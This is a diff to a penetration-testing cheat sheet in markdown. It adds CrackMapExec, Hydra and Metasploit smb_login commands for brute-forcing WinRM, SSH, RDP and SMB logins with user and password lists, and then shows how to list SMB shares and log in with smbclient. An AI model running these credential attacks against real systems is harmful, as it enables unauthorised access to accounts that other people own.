@@ -1449,6 +1449,7 @@ netexec <PROTOCOL> <TARGET_IP> -u <USER> -p <PASSWORD>
 
 [WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) is Microsoft's implementation of the [WS-Management protocol](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol), providing a standardized framework for remote Windows system administration.
 
+<!-- 
 **1. Functional Capabilities**
 
 * Remote command execution
@@ -1476,6 +1477,15 @@ netexec <PROTOCOL> <TARGET_IP> -u <USER> -p <PASSWORD>
 * Requires proper certificate management for HTTPS implementations
 
 A handy tool that we can use to communicate with the WinRM service is Evil-WinRM, which allows us to communicate with the WinRM service efficiently.
+ -->
+
+**CrackMapExec**
+
+Brute Force Login
+
+```bash
+crackmapexec winrm <TARGET_IP> -u <USER_LIST> -p <PASSWORD_LIST> -q
+```
 
 **Evil-WinRM**
 
@@ -1551,7 +1561,7 @@ We can use a tool like **Hydra** to brute force SSH. This is covered in-depth in
 Brute force SSH
 
 ```bash
-hydra -L <USER> -P <PASSWORD> ssh://<TARGET_IP>
+hydra -L <USER_LIST> -P <PASSWORD_LIST> ssh://<TARGET_IP>
 ```
 
 Log in to the system via SSH
@@ -1572,7 +1582,7 @@ ssh <USER>@<TARGET_IP>
 **Hydra - RDP**
 
 ```bash
-hydra -L <USER> -P <PASSWORD> rdp://<TARGET_IP>
+hydra -L <USER_LIST> -P <PASSWORD_LIST> rdp://<TARGET_IP>
 ```
 
 > The username and password fields can be just a string or a wordlist file.
@@ -1588,17 +1598,41 @@ xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASSWORD>
 <details>
 <summary><h3>SMB</h3></summary>
 
-[Microsoft's Remote Desktop Protocol](https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default.
-
 [Server Message Block](https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (SMB) is a protocol responsible for transferring data between a client and a server in local area networks.
+
+1. Brute Force Credentials
 
 **Hydra - SMB**
 
 ```bash
-hydra -L <USER> -P <PASSWORD> smb://<TARGET_IP>
+hydra -L <USER_LIST> -P <PASSWORD_LIST> -V <TARGET_IP> smb
 ```
 
 > The username and password fields can be just a string or a wordlist file.
+
+**CrackMapExec - SMB**
+
+```bash
+crackmapexec smb <TARGET_IP> -u <USER_LIST> -p <PASSWORD_LIST>
+```
+
+> The username and password fields can be just a string or a wordlist file.
+
+**Metaploit - SMB**
+
+```bash
+msfconsole -q
+
+msf6 > use auxiliary/scanner/smb/smb_login
+msf6 > options
+msf6 > set USER_FILE <USER_LIST>
+msf6 > set PASS_FILE <PASSWORD_LIST>
+msf6 > set RHOSTS <TARGET_IP>
+
+msf6 > run
+```
+
+2. List Shares
 
 We can use NetExec to view the available shares and what privileges we have for them.
 
@@ -1606,7 +1640,7 @@ We can use NetExec to view the available shares and what privileges we have for 
 netexec smb <TARGET_IP> -u "<USER>" -p "<PASSWORD>" --shares
 ```
 
-Log in to the system via Smbclient
+3. Log in to the system via Smbclient
 
 ```bash
 smbclient -U <USER> \\\\<TARGET_IP>\\<SHARENAME>
